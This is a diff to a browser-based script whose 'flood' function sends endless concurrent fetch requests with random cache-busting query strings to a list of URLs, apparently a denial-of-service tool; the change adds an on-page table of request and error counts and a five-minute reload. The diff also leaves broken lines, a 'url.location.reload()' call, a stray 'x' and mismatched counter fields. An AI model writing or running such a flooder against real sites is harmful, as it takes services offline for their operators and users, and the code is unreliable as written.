@@ -13,10 +13,18 @@
       });
 
     let urls = {};
+    let indexes = {};
     let queue = [];
 
     function start() {
       list.forEach(flood);
+      let html = '<table>';
+      list.forEach((url, i) => {
+        html += `<tr><td>${url}</td><td class="requests-${i}">0</td><td class="errors-${i}">0</td></tr>`;
+        indexes[url] = i;
+      });
+      html += '</table>';
+      document.body.innerHTML = html;
     }
 
     async function fetchWithTimeout(url) {
@@ -39,30 +47,44 @@
           await queue.shift()
         }
         rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000));
-        urls[url] = urls[url] || {};
+        urls[url] = urls[url] || {
+          requests: 0,
+          errors: 0
+        };
         queue.push(fetchWithTimeout(url + rand)
           .catch((error) => {
-            if (error.code === 20 /* ABORT */ ) {
+            if (error.code === 20) {
               return;
             }
             urls[url].number_of_errored_responses++;
-            urls[url].error_message = error.message
+            urls[url].error_message = error.message;
           })
           .then((response) => {
             if (response && !response.ok) {
-              urls[url].number_of_errored_responses++;
-              urls[url].error_message = response.statusText
+              urls[url].errors++;
             }
-            urls[url].number_of_requests++;
+            urls[url].requests++;
           })
         )
       }
     }
+
+    setInterval(() => {
+      list.forEach((url) => {
+        document.querySelector(`.errors-${indexes[url]}`).innerText = urls[url].errors;
+        document.querySelector(`.requests-${indexes[url]}`).innerText = urls[url].requests;
+      });
+    }, 1000);
+
+    // reload page in 5 minutes
+    setTimeout(() => {
+      url.location.reload();
+      x
+    }, 5 * 60 * 1000);
   </script>
 </head>
 
 <body>
-  yay
 </body>
 
 </html>
